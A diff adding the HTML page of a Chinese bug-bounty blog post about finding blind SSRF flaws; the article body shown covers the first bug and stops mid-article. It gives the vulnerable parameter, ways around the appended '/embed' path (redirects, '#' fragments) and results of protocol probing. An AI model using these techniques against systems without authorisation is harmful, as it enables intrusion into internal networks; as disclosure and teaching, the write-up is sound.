@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="en-zh">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <script type="text/javascript" src="/js/cactus.js "></script>
+  
+  <link rel="stylesheet" href="/lib/my/cactus.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> 我是如何挖到三个Blind SSRF漏洞并赚到250美刀赏金的 | 无在无不在</title>
+  <link rel = 'canonical' href = 'https://shangrui-hash.github.io/posts/bugbounty/story/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E6%8C%96%E5%88%B0%E4%B8%89%E4%B8%AA%E4%BB%B7%E5%80%BC250%E7%BE%8E%E5%88%80%E7%9A%84blind-ssrf%E6%BC%8F%E6%B4%9E%E7%9A%84/'>
+  <meta name="description" content="精于一而悟道">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="我是如何挖到三个Blind SSRF漏洞并赚到250美刀赏金的" />
+<meta property="og:description" content="这是hackerone上的一个私人项目
+第一个Blind SSRF 第一个Blind SSRF 位于邀请链接页面:
+https://www.target.com/give-5-get-5/UOG262 挂上burpsuite作为代理，监控该页面触发的所有流量，发现该页面会发送POST请求给 https://www.target.com/rpc/url-health-check-rpc/check
+请求参数为:
+url=https%3A%2F%2Fwww.instagram.com%2Fp%2FBuMIheXHKsS%2F&amp;sourceUrl=https%3A%2F%2Fwww.target.com%2Fgive-5-get-5%2FUOG262 返回的响应为:
+{&#34;result&#34;:null,&#34;output&#34;:&#34;&#34;} 经过测试，该请求的url 参数存在blind ssrf 漏洞
+从请求报文中可以看到，服务端会自动向URL的末尾添加/embed ，导致攻击者无法完全控制URL的path的部分，但是绕过方法很多：
+ 该特性可以通过30x重定向绕过。 使用#将追加的/embed 变成锚点部分  这几乎是一个全盲的SSRF漏洞：
+ 似乎没有任何SSRF filter来检查和过滤用户输入的URL，不需要任何绕过。 异步请求，无法通过延时来进行内网端口扫描(XSPA) 没有任何回显 不支持gopher协议，不支持file协议 不存在CRLF注入，不能走私请求报文 会跟随30x重定向  所以单纯利用该SSRF，我们几乎无法知道自己是否成功打到了内网。
+但是通过反连请求，我大约收集到5个不同的IP地址，这些IP地址都是AWS的IP地址，所以大致可以推断，目标站点部署在AWS上,并且似乎做了负载均衡
+我开始推测为什么访问该页面会触发上述POST请求，于是我审计了这个页面的前端代码，发现该页面使用iframe 嵌入Instagram的一些页面，同时使用js代码来检查这些Instagram页面对应的的URL是否health ，相关js代码如下:
+ RPC(&#39;url-health-check/check&#39;, {url: &#34;https:\/\/www.instagram.com\/p\/BuMIheXHKsS\/&#34;, sourceUrl: &#34;https:\/\/www.target.com\/give-5-get-5\/UOG262&#34;}); RPC 是目标站点封装好的一个用来发送http请求的函数
+console.log(RPC&#43;&#39;&#39;) function RPC(e, t, o, i) {  i = i || {},  t = t || {};  var s = e." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shangrui-hash.github.io/posts/bugbounty/story/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E6%8C%96%E5%88%B0%E4%B8%89%E4%B8%AA%E4%BB%B7%E5%80%BC250%E7%BE%8E%E5%88%80%E7%9A%84blind-ssrf%E6%BC%8F%E6%B4%9E%E7%9A%84/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-24T22:24:18+08:00" />
+<meta property="article:modified_time" content="2022-09-24T22:24:18+08:00" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="我是如何挖到三个Blind SSRF漏洞并赚到250美刀赏金的"/>
+<meta name="twitter:description" content="这是hackerone上的一个私人项目
+第一个Blind SSRF 第一个Blind SSRF 位于邀请链接页面:
+https://www.target.com/give-5-get-5/UOG262 挂上burpsuite作为代理，监控该页面触发的所有流量，发现该页面会发送POST请求给 https://www.target.com/rpc/url-health-check-rpc/check
+请求参数为:
+url=https%3A%2F%2Fwww.instagram.com%2Fp%2FBuMIheXHKsS%2F&amp;sourceUrl=https%3A%2F%2Fwww.target.com%2Fgive-5-get-5%2FUOG262 返回的响应为:
+{&#34;result&#34;:null,&#34;output&#34;:&#34;&#34;} 经过测试，该请求的url 参数存在blind ssrf 漏洞
+从请求报文中可以看到，服务端会自动向URL的末尾添加/embed ，导致攻击者无法完全控制URL的path的部分，但是绕过方法很多：
+ 该特性可以通过30x重定向绕过。 使用#将追加的/embed 变成锚点部分  这几乎是一个全盲的SSRF漏洞：
+ 似乎没有任何SSRF filter来检查和过滤用户输入的URL，不需要任何绕过。 异步请求，无法通过延时来进行内网端口扫描(XSPA) 没有任何回显 不支持gopher协议，不支持file协议 不存在CRLF注入，不能走私请求报文 会跟随30x重定向  所以单纯利用该SSRF，我们几乎无法知道自己是否成功打到了内网。
+但是通过反连请求，我大约收集到5个不同的IP地址，这些IP地址都是AWS的IP地址，所以大致可以推断，目标站点部署在AWS上,并且似乎做了负载均衡
+我开始推测为什么访问该页面会触发上述POST请求，于是我审计了这个页面的前端代码，发现该页面使用iframe 嵌入Instagram的一些页面，同时使用js代码来检查这些Instagram页面对应的的URL是否health ，相关js代码如下:
+ RPC(&#39;url-health-check/check&#39;, {url: &#34;https:\/\/www.instagram.com\/p\/BuMIheXHKsS\/&#34;, sourceUrl: &#34;https:\/\/www.target.com\/give-5-get-5\/UOG262&#34;}); RPC 是目标站点封装好的一个用来发送http请求的函数
+console.log(RPC&#43;&#39;&#39;) function RPC(e, t, o, i) {  i = i || {},  t = t || {};  var s = e."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://shangrui-hash.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://shangrui-hash.github.io/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://shangrui-hash.github.io/about/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&text=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&title=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&is_video=false&description=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84&body=Check out this article: https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&title=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&title=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&name=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84&description=%e8%bf%99%e6%98%afhackerone%e4%b8%8a%e7%9a%84%e4%b8%80%e4%b8%aa%e7%a7%81%e4%ba%ba%e9%a1%b9%e7%9b%ae%0a%e7%ac%ac%e4%b8%80%e4%b8%aaBlind%20SSRF%20%e7%ac%ac%e4%b8%80%e4%b8%aaBlind%20SSRF%20%e4%bd%8d%e4%ba%8e%e9%82%80%e8%af%b7%e9%93%be%e6%8e%a5%e9%a1%b5%e9%9d%a2%3a%0ahttps%3a%2f%2fwww.target.com%2fgive-5-get-5%2fUOG262%20%e6%8c%82%e4%b8%8aburpsuite%e4%bd%9c%e4%b8%ba%e4%bb%a3%e7%90%86%ef%bc%8c%e7%9b%91%e6%8e%a7%e8%af%a5%e9%a1%b5%e9%9d%a2%e8%a7%a6%e5%8f%91%e7%9a%84%e6%89%80%e6%9c%89%e6%b5%81%e9%87%8f%ef%bc%8c%e5%8f%91%e7%8e%b0%e8%af%a5%e9%a1%b5%e9%9d%a2%e4%bc%9a%e5%8f%91%e9%80%81POST%e8%af%b7%e6%b1%82%e7%bb%99%20https%3a%2f%2fwww.target.com%2frpc%2furl-health-check-rpc%2fcheck%0a%e8%af%b7%e6%b1%82%e5%8f%82%e6%95%b0%e4%b8%ba%3a%0aurl%3dhttps%253A%252F%252Fwww.instagram.com%252Fp%252FBuMIheXHKsS%252F%26amp%3bsourceUrl%3dhttps%253A%252F%252Fwww.target.com%252Fgive-5-get-5%252FUOG262%20%e8%bf%94%e5%9b%9e%e7%9a%84%e5%93%8d%e5%ba%94%e4%b8%ba%3a%0a%7b%26%2334%3bresult%26%2334%3b%3anull%2c%26%2334%3boutput%26%2334%3b%3a%26%2334%3b%26%2334%3b%7d%20%e7%bb%8f%e8%bf%87%e6%b5%8b%e8%af%95%ef%bc%8c%e8%af%a5%e8%af%b7%e6%b1%82%e7%9a%84url%20%e5%8f%82%e6%95%b0%e5%ad%98%e5%9c%a8blind%20ssrf%20%e6%bc%8f%e6%b4%9e%0a%e4%bb%8e%e8%af%b7%e6%b1%82%e6%8a%a5%e6%96%87%e4%b8%ad%e5%8f%af%e4%bb%a5%e7%9c%8b%e5%88%b0%ef%bc%8c%e6%9c%8d%e5%8a%a1%e7%ab%af%e4%bc%9a%e8%87%aa%e5%8a%a8%e5%90%91URL%e7%9a%84%e6%9c%ab%e5%b0%be%e6%b7%bb%e5%8a%a0%2fembed%20%ef%bc%8c%e5%af%bc%e8%87%b4%e6%94%bb%e5%87%bb%e8%80%85%e6%97%a0%e6%b3%95%e5%ae%8c%e5%85%a8%e6%8e%a7%e5%88%b6URL%e7%9a%84path%e7%9a%84%e9%83%a8%e5%88%86%ef%bc%8c%e4%bd%86%e6%98%af%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95%e5%be%88%e5%a4%9a%ef%bc%9a%0a%20%e8%af%a5%e7%89%b9%e6%80%a7%e5%8f%af%e4%bb%a5%e9%80%9a%e8%bf%8730x%e9%87%8d%e5%ae%9a%e5%90%91%e7%bb%95%e8%bf%87%e3%80%82%20%e4%bd%bf%e7%94%a8%23%e5%b0%86%e8%bf%bd%e5%8a%a0%e7%9a%84%2fembed%20%e5%8f%98%e6%88%90%e9%94%9a%e7%82%b9%e9%83%a8%e5%88%86%20%20%e8%bf%99%e5%87%a0%e4%b9%8e%e6%98%af%e4%b8%80%e4%b8%aa%e5%85%a8%e7%9b%b2%e7%9a%84SSRF%e6%bc%8f%e6%b4%9e%ef%bc%9a%0a%20%e4%bc%bc%e4%b9%8e%e6%b2%a1%e6%9c%89%e4%bb%bb%e4%bd%95SSRF%20filter%e6%9d%a5%e6%a3%80%e6%9f%a5%e5%92%8c%e8%bf%87%e6%bb%a4%e7%94%a8%e6%88%b7%e8%be%93%e5%85%a5%e7%9a%84URL%ef%bc%8c%e4%b8%8d%e9%9c%80%e8%a6%81%e4%bb%bb%e4%bd%95%e7%bb%95%e8%bf%87%e3%80%82%20%e5%bc%82%e6%ad%a5%e8%af%b7%e6%b1%82%ef%bc%8c%e6%97%a0%e6%b3%95%e9%80%9a%e8%bf%87%e5%bb%b6%e6%97%b6%e6%9d%a5%e8%bf%9b%e8%a1%8c%e5%86%85%e7%bd%91%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%28XSPA%29%20%e6%b2%a1%e6%9c%89%e4%bb%bb%e4%bd%95%e5%9b%9e%e6%98%be%20%e4%b8%8d%e6%94%af%e6%8c%81gopher%e5%8d%8f%e8%ae%ae%ef%bc%8c%e4%b8%8d%e6%94%af%e6%8c%81file%e5%8d%8f%e8%ae%ae%20%e4%b8%8d%e5%ad%98%e5%9c%a8CRLF%e6%b3%a8%e5%85%a5%ef%bc%8c%e4%b8%8d%e8%83%bd%e8%b5%b0%e7%a7%81%e8%af%b7%e6%b1%82%e6%8a%a5%e6%96%87%20%e4%bc%9a%e8%b7%9f%e9%9a%8f30x%e9%87%8d%e5%ae%9a%e5%90%91%20%20%e6%89%80%e4%bb%a5%e5%8d%95%e7%ba%af%e5%88%a9%e7%94%a8%e8%af%a5SSRF%ef%bc%8c%e6%88%91%e4%bb%ac%e5%87%a0%e4%b9%8e%e6%97%a0%e6%b3%95%e7%9f%a5%e9%81%93%e8%87%aa%e5%b7%b1%e6%98%af%e5%90%a6%e6%88%90%e5%8a%9f%e6%89%93%e5%88%b0%e4%ba%86%e5%86%85%e7%bd%91%e3%80%82%0a%e4%bd%86%e6%98%af%e9%80%9a%e8%bf%87%e5%8f%8d%e8%bf%9e%e8%af%b7%e6%b1%82%ef%bc%8c%e6%88%91%e5%a4%a7%e7%ba%a6%e6%94%b6%e9%9b%86%e5%88%b05%e4%b8%aa%e4%b8%8d%e5%90%8c%e7%9a%84IP%e5%9c%b0%e5%9d%80%ef%bc%8c%e8%bf%99%e4%ba%9bIP%e5%9c%b0%e5%9d%80%e9%83%bd%e6%98%afAWS%e7%9a%84IP%e5%9c%b0%e5%9d%80%ef%bc%8c%e6%89%80%e4%bb%a5%e5%a4%a7%e8%87%b4%e5%8f%af%e4%bb%a5%e6%8e%a8%e6%96%ad%ef%bc%8c%e7%9b%ae%e6%a0%87%e7%ab%99%e7%82%b9%e9%83%a8%e7%bd%b2%e5%9c%a8AWS%e4%b8%8a%2c%e5%b9%b6%e4%b8%94%e4%bc%bc%e4%b9%8e%e5%81%9a%e4%ba%86%e8%b4%9f%e8%bd%bd%e5%9d%87%e8%a1%a1%0a%e6%88%91%e5%bc%80%e5%a7%8b%e6%8e%a8%e6%b5%8b%e4%b8%ba%e4%bb%80%e4%b9%88%e8%ae%bf%e9%97%ae%e8%af%a5%e9%a1%b5%e9%9d%a2%e4%bc%9a%e8%a7%a6%e5%8f%91%e4%b8%8a%e8%bf%b0POST%e8%af%b7%e6%b1%82%ef%bc%8c%e4%ba%8e%e6%98%af%e6%88%91%e5%ae%a1%e8%ae%a1%e4%ba%86%e8%bf%99%e4%b8%aa%e9%a1%b5%e9%9d%a2%e7%9a%84%e5%89%8d%e7%ab%af%e4%bb%a3%e7%a0%81%ef%bc%8c%e5%8f%91%e7%8e%b0%e8%af%a5%e9%a1%b5%e9%9d%a2%e4%bd%bf%e7%94%a8iframe%20%e5%b5%8c%e5%85%a5Instagram%e7%9a%84%e4%b8%80%e4%ba%9b%e9%a1%b5%e9%9d%a2%ef%bc%8c%e5%90%8c%e6%97%b6%e4%bd%bf%e7%94%a8js%e4%bb%a3%e7%a0%81%e6%9d%a5%e6%a3%80%e6%9f%a5%e8%bf%99%e4%ba%9bInstagram%e9%a1%b5%e9%9d%a2%e5%af%b9%e5%ba%94%e7%9a%84%e7%9a%84URL%e6%98%af%e5%90%a6health%20%ef%bc%8c%e7%9b%b8%e5%85%b3js%e4%bb%a3%e7%a0%81%e5%a6%82%e4%b8%8b%3a%0a%20RPC%28%26%2339%3burl-health-check%2fcheck%26%2339%3b%2c%20%7burl%3a%20%26%2334%3bhttps%3a%5c%2f%5c%2fwww.instagram.com%5c%2fp%5c%2fBuMIheXHKsS%5c%2f%26%2334%3b%2c%20sourceUrl%3a%20%26%2334%3bhttps%3a%5c%2f%5c%2fwww.target.com%5c%2fgive-5-get-5%5c%2fUOG262%26%2334%3b%7d%29%3b%20RPC%20%e6%98%af%e7%9b%ae%e6%a0%87%e7%ab%99%e7%82%b9%e5%b0%81%e8%a3%85%e5%a5%bd%e7%9a%84%e4%b8%80%e4%b8%aa%e7%94%a8%e6%9d%a5%e5%8f%91%e9%80%81http%e8%af%b7%e6%b1%82%e7%9a%84%e5%87%bd%e6%95%b0%0aconsole.log%28RPC%2b%26%2339%3b%26%2339%3b%29%20function%20RPC%28e%2c%20t%2c%20o%2c%20i%29%20%7b%20%20i%20%3d%20i%20%7c%7c%20%7b%7d%2c%20%20t%20%3d%20t%20%7c%7c%20%7b%7d%3b%20%20var%20s%20%3d%20e." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&t=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#第一个blind-ssrf">第一个Blind SSRF</a></li>
+    <li><a href="#第二个blind-ssrf半盲">第二个Blind SSRF(半盲)</a></li>
+    <li><a href="#第三个blind-ssrf">第三个Blind SSRF</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        我是如何挖到三个Blind SSRF漏洞并赚到250美刀赏金的
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2022-09-24 22:24:18 &#43;0800 CST" itemprop="datePublished">2022-09-24</time>
+          
+        </div>
+        
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/story">story</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/ssrf" rel="tag">SSRF</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>这是hackerone上的一个私人项目</p>
+<h2 id="第一个blind-ssrf">第一个Blind SSRF</h2>
+<p>第一个Blind SSRF 位于邀请链接页面:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://www.target.com/give-5-get-5/UOG262
+</span></span></code></pre></div><p>挂上burpsuite作为代理，监控该页面触发的所有流量，发现该页面会发送POST请求给 <a href="https://www.target.com/rpc/url-health-check-rpc/check">https://www.target.com/rpc/url-health-check-rpc/check</a></p>
+<p>请求参数为:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>url=https%3A%2F%2Fwww.instagram.com%2Fp%2FBuMIheXHKsS%2F&amp;sourceUrl=https%3A%2F%2Fwww.target.com%2Fgive-5-get-5%2FUOG262
+</span></span></code></pre></div><p>返回的响应为:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{&#34;result&#34;:null,&#34;output&#34;:&#34;&#34;}
+</span></span></code></pre></div><p>经过测试，该请求的url 参数存在blind ssrf 漏洞</p>
+<p><img src="../../../image/blind-ssrf-1.jpg" alt="blind-ssrf-1.jpg"></p>
+<p>从请求报文中可以看到，服务端会自动向URL的末尾添加/embed ，导致攻击者无法完全控制URL的path的部分，但是绕过方法很多：</p>
+<ol>
+<li>该特性可以通过30x重定向绕过。</li>
+<li>使用<code>#</code>将追加的<code>/embed</code> 变成锚点部分</li>
+</ol>
+<p>这几乎是一个全盲的SSRF漏洞：</p>
+<ol>
+<li>似乎没有任何SSRF filter来检查和过滤用户输入的URL，不需要任何绕过。</li>
+<li>异步请求，无法通过延时来进行内网端口扫描(XSPA)</li>
+<li>没有任何回显</li>
+<li>不支持gopher协议，不支持file协议</li>
+<li>不存在CRLF注入，不能走私请求报文</li>
+<li>会跟随30x重定向</li>
+</ol>
+<p>所以单纯利用该SSRF，我们几乎无法知道自己是否成功打到了内网。</p>
+<p>但是通过反连请求，我大约收集到5个不同的IP地址，这些IP地址都是AWS的IP地址，所以大致可以推断，目标站点部署在AWS上,并且似乎做了负载均衡</p>
+<p>我开始推测为什么访问该页面会触发上述POST请求，于是我审计了这个页面的前端代码，发现该页面使用iframe 嵌入Instagram的一些页面，同时使用js代码来检查这些Instagram页面对应的的URL是否health ，相关js代码如下:</p>
